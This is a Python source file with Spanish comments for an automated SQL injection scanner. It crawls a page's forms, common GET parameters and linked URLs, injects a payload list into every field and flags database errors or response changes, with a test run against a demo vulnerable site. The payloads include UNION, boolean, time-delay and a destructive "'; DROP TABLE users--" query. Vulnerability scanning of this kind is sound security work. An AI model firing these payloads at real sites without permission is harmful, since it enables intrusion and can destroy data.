# scanners/sql_injection_scanner.py
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re
import time
from typing import List, Dict, Optional
import random

class SQLInjectionScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Payloads de SQL Injection para diferentes tipos de bases de datos
        self.sql_payloads = [
            # Payloads básicos de error
            "'",
            "\"",
            "')",
            "';",
            "\")",
            "\";",
            
            # Union-based payloads
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL--",
            
            # Boolean-based payloads
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "\" OR \"1\"=\"1",
            "\" OR 1=1--",
            
            # Time-based payloads
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO",
            
            # Numeric injection
            "1 OR 1=1",
            "1' OR '1'='1",
            "1) OR (1=1",
        ]
        
        # Patrones de error de bases de datos comunes
        self.error_patterns = [
            # MySQL
            r"mysql_fetch_array\(\)",
            r"mysql_fetch_assoc\(\)",
            r"mysql_num_rows\(\)",
            r"MySQL server version",
            r"supplied argument is not a valid MySQL",
            r"You have an error in your SQL syntax",
            
            # PostgreSQL
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"PostgreSQL query failed",
            r"invalid input syntax for",
            
            # SQL Server
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark after the character string",
            r"Microsoft JET Database Engine",
            
            # Oracle
            r"ORA-[0-9]{4,5}",
            r"Oracle ODBC",
            r"Oracle Driver",
            
            # SQLite
            r"SQLite/JDBCDriver",
            r"System\.Data\.SQLite\.SQLiteException",
            
            # Errores generales
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"Syntax error.*query expression",
        ]
    
    def scan_url(self, target_url: str) -> Dict:
        """
        Escanea una URL buscando vulnerabilidades de SQL Injection
        """
        print(f"💉 Iniciando escaneo SQL Injection para: {target_url}")
        
        results = {
            "url": target_url,
            "vulnerable": False,
            "vulnerabilities": [],
            "forms_found": 0,
            "params_tested": 0,
            "scan_time": None,
            "error": None
        }
        
        start_time = time.time()
        
        try:
            # 1. Obtener la página principal
            response = self.session.get(target_url, timeout=15)
            if response.status_code != 200:
                results["error"] = f"No se pudo acceder a la URL. Código: {response.status_code}"
                return results
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 2. Buscar formularios en la página
            forms = soup.find_all('form')
            results["forms_found"] = len(forms)
            
            print(f"📋 Formularios encontrados: {len(forms)}")
            
            # 3. Probar SQL injection en formularios
            for form in forms:
                vuln_found = self._test_form_sqli(target_url, form)
                if vuln_found:
                    results["vulnerabilities"].extend(vuln_found)
                    results["vulnerable"] = True
            
            # 4. Probar SQL injection en parámetros GET
            get_vuln = self._test_get_parameters_sqli(target_url)
            if get_vuln:
                results["vulnerabilities"].extend(get_vuln)
                results["vulnerable"] = True
            
            # 5. Buscar URLs con parámetros en la página
            param_urls = self._extract_urls_with_params(target_url, soup)
            for param_url in param_urls:
                url_vuln = self._test_url_sqli(param_url)
                if url_vuln:
                    results["vulnerabilities"].extend(url_vuln)
                    results["vulnerable"] = True
                    
        except requests.RequestException as e:
            results["error"] = f"Error de conexión: {str(e)}"
        except Exception as e:
            results["error"] = f"Error inesperado: {str(e)}"
        
        results["scan_time"] = round(time.time() - start_time, 2)
        
        # Mostrar resultados
        if results["vulnerable"]:
            print(f"🚨 ¡VULNERABILIDAD SQL INJECTION ENCONTRADA!")
            print(f"   Vulnerabilidades: {len(results['vulnerabilities'])}")
            for vuln in results["vulnerabilities"]:
                print(f"   - {vuln['type']} en {vuln['location']}")
        else:
            print(f"✅ No se encontraron vulnerabilidades SQL Injection")
        
        print(f"⏱️  Tiempo de escaneo: {results['scan_time']} segundos")
        
        return results
    
    def _test_form_sqli(self, base_url: str, form) -> List[Dict]:
        """
        Prueba SQL injection en un formulario específico
        """
        vulnerabilities = []
        
        try:
            # Obtener información del formulario
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            
            # Construir URL completa
            form_url = urljoin(base_url, action)
            
            # Obtener todos los campos del formulario
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_data = {}
            
            for input_field in inputs:
                name = input_field.get('name')
                if name:
                    input_type = input_field.get('type', 'text').lower()
                    
                    # Asignar valores por defecto según el tipo
                    if input_type in ['text', 'search', 'email', 'url', 'number']:
                        form_data[name] = 'test'
                    elif input_type == 'hidden':
                        form_data[name] = input_field.get('value', '')
                    elif input_type in ['submit', 'button']:
                        continue
                    else:
                        form_data[name] = 'test'
            
            if not form_data:
                return vulnerabilities
            
            print(f"💉 Probando SQL injection en formulario: {form_url}")
            print(f"   Campos: {list(form_data.keys())}")
            
            # Obtener respuesta normal primero (baseline)
            try:
                if method == 'post':
                    normal_response = self.session.post(form_url, data=form_data, timeout=15)
                else:
                    normal_response = self.session.get(form_url, params=form_data, timeout=15)
                normal_content = normal_response.text
                normal_length = len(normal_content)
            except:
                return vulnerabilities
            
            # Probar cada payload en cada campo susceptible
            for field_name in form_data:
                if self._is_injectable_field(field_name, form_data[field_name]):
                    for payload in self.sql_payloads:
                        test_data = form_data.copy()
                        test_data[field_name] = payload
                        
                        try:
                            if method == 'post':
                                response = self.session.post(form_url, data=test_data, timeout=15)
                            else:
                                response = self.session.get(form_url, params=test_data, timeout=15)
                            
                            # Verificar diferentes tipos de SQL injection
                            vuln_found = self._analyze_response_for_sqli(
                                response, normal_response, payload, {
                                    "type": "Form SQL Injection",
                                    "location": form_url,
                                    "field": field_name,
                                    "method": method.upper()
                                }
                            )
                            
                            if vuln_found:
                                vulnerabilities.append(vuln_found)
                                print(f"🚨 SQL Injection encontrado en campo '{field_name}'!")
                                break  # No probar más payloads en este campo
                        
                        except requests.RequestException:
                            continue
                        
                        # Pausa para no saturar
                        time.sleep(0.2)
        
        except Exception as e:
            print(f"❌ Error probando formulario SQL injection: {e}")
        
        return vulnerabilities
    
    def _test_get_parameters_sqli(self, target_url: str) -> List[Dict]:
        """
        Prueba SQL injection en parámetros GET comunes
        """
        vulnerabilities = []
        
        # Parámetros comunes susceptibles a SQL injection
        common_params = [
            'id', 'user_id', 'product_id', 'page_id', 'category_id',
            'search', 'q', 'query', 'keyword',
            'user', 'username', 'email',
            'page', 'limit', 'offset',
            'sort', 'order', 'filter'
        ]
        
        print(f"💉 Probando parámetros GET para SQL injection...")
        
        for param in common_params:
            # Obtener respuesta normal
            try:
                normal_url = f"{target_url}?{param}=1"
                normal_response = self.session.get(normal_url, timeout=15)
            except:
                continue
            
            # Probar algunos payloads selectos
            for payload in self.sql_payloads[:8]:  # Solo los primeros 8 para ser eficiente
                try:
                    test_url = f"{target_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=15)
                    
                    vuln_found = self._analyze_response_for_sqli(
                        response, normal_response, payload, {
                            "type": "URL Parameter SQL Injection",
                            "location": test_url,
                            "parameter": param,
                            "method": "GET"
                        }
                    )
                    
                    if vuln_found:
                        vulnerabilities.append(vuln_found)
                        print(f"🚨 SQL Injection encontrado en parámetro '{param}'!")
                        break
                
                except requests.RequestException:
                    continue
                
                time.sleep(0.2)
        
        return vulnerabilities
    
    def _test_url_sqli(self, url: str) -> List[Dict]:
        """
        Prueba SQL injection en una URL que ya tiene parámetros
        """
        vulnerabilities = []
        
        try:
            parsed_url = urlparse(url)
            if not parsed_url.query:
                return vulnerabilities
            
            # Obtener respuesta normal
            normal_response = self.session.get(url, timeout=15)
            
            # Probar inyección en cada parámetro
            params = parsed_url.query.split('&')
            for param_pair in params:
                if '=' in param_pair:
                    param_name, param_value = param_pair.split('=', 1)
                    
                    for payload in self.sql_payloads[:5]:  # Solo algunos payloads
                        try:
                            modified_query = parsed_url.query.replace(
                                f"{param_name}={param_value}",
                                f"{param_name}={payload}"
                            )
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
                            
                            response = self.session.get(test_url, timeout=15)
                            
                            vuln_found = self._analyze_response_for_sqli(
                                response, normal_response, payload, {
                                    "type": "URL SQL Injection",
                                    "location": test_url,
                                    "parameter": param_name,
                                    "method": "GET"
                                }
                            )
                            
                            if vuln_found:
                                vulnerabilities.append(vuln_found)
                                break
                        
                        except requests.RequestException:
                            continue
                        
                        time.sleep(0.1)
        
        except Exception as e:
            print(f"❌ Error probando URL SQL injection: {e}")
        
        return vulnerabilities
    
    def _analyze_response_for_sqli(self, response, normal_response, payload, base_info) -> Optional[Dict]:
        """
        Analiza la respuesta para detectar SQL injection
        """
        response_text = response.text
        normal_text = normal_response.text
        
        # 1. Verificar errores de base de datos
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return {
                    **base_info,
                    "payload": payload,
                    "severity": "High",
                    "evidence": "Database error detected",
                    "details": f"Error pattern found: {pattern}"
                }
        
        # 2. Verificar cambios significativos en la respuesta
        length_diff = abs(len(response_text) - len(normal_text))
        if length_diff > len(normal_text) * 0.3:  # Cambio mayor al 30%
            return {
                **base_info,
                "payload": payload,
                "severity": "Medium",
                "evidence": "Significant response change",
                "details": f"Response length changed from {len(normal_text)} to {len(response_text)}"
            }
        
        # 3. Verificar códigos de estado diferentes
        if response.status_code != normal_response.status_code:
            if response.status_code in [500, 503, 400]:
                return {
                    **base_info,
                    "payload": payload,
                    "severity": "Medium",
                    "evidence": "HTTP status code change",
                    "details": f"Status changed from {normal_response.status_code} to {response.status_code}"
                }
        
        # 4. Verificar patrones específicos de SQL injection exitoso
        success_patterns = [
            r"UNION.*SELECT",
            r"syntax.*error.*near",
            r"ORA-\d+",
            r"mysql_.*error",
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return {
                    **base_info,
                    "payload": payload,
                    "severity": "High",
                    "evidence": "SQL injection pattern detected",
                    "details": f"Success pattern found: {pattern}"
                }
        
        return None
    
    def _is_injectable_field(self, field_name: str, field_value: str) -> bool:
        """
        Determina si un campo es susceptible a SQL injection
        """
        # Campos que típicamente son vulnerables
        injectable_fields = [
            'id', 'user_id', 'product_id', 'category_id',
            'search', 'query', 'q', 'keyword',
            'username', 'email', 'login',
            'sort', 'order', 'filter'
        ]
        
        # Si el nombre del campo sugiere que podría ser vulnerable
        field_lower = field_name.lower()
        for injectable in injectable_fields:
            if injectable in field_lower:
                return True
        
        # Si el valor del campo parece numérico
        if field_value.isdigit():
            return True
        
        return True  # Por defecto, probar todos los campos
    
    def _extract_urls_with_params(self, base_url: str, soup) -> List[str]:
        """
        Extrae URLs con parámetros de la página
        """
        urls = []
        links = soup.find_all('a', href=True)
        
        for link in links:
            href = link['href']
            full_url = urljoin(base_url, href)
            
            if '?' in full_url and '=' in full_url:
                urls.append(full_url)
        
        return urls[:5]  # Limitar a 5 URLs para no ser demasiado lento

# Función de prueba
def test_sql_scanner():
    scanner = SQLInjectionScanner()
    
    test_urls = [
        "http://testphp.vulnweb.com/artists.php?artist=1",
        "http://testphp.vulnweb.com/listproducts.php?cat=1",
        "http://testphp.vulnweb.com/",
    ]
    
    for url in test_urls:
        print(f"\n{'='*60}")
        print(f"PROBANDO SQL INJECTION: {url}")
        print(f"{'='*60}")
        
        result = scanner.scan_url(url)
        
        if result["error"]:
            print(f"❌ Error: {result['error']}")
        else:
            print(f"📊 RESUMEN:")
            print(f"   - Formularios encontrados: {result['forms_found']}")
            print(f"   - Vulnerable: {'SÍ' if result['vulnerable'] else 'NO'}")
            print(f"   - Vulnerabilidades: {len(result['vulnerabilities'])}")
            print(f"   - Tiempo: {result['scan_time']}s")
            
            if result["vulnerabilities"]:
                print(f"\n💉 DETALLES DE VULNERABILIDADES:")
                for i, vuln in enumerate(result["vulnerabilities"], 1):
                    print(f"   {i}. {vuln['type']}")
                    print(f"      Ubicación: {vuln['location']}")
                    print(f"      Payload: {vuln['payload']}")
                    print(f"      Severidad: {vuln['severity']}")
                    print(f"      Evidencia: {vuln['evidence']}")

if __name__ == "__main__":
    test_sql_scanner()
